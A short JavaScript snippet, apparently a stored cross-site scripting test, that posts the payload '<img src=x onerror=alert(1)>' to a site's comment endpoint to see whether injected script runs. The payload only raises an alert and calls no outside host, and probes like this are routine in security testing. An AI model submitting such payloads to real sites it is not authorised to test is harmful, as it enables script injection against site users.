fetch('/comment', {
  method: 'POST',
  headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
  body: 'comment=' + encodeURIComponent('<img src=x onerror=alert(1)>')
});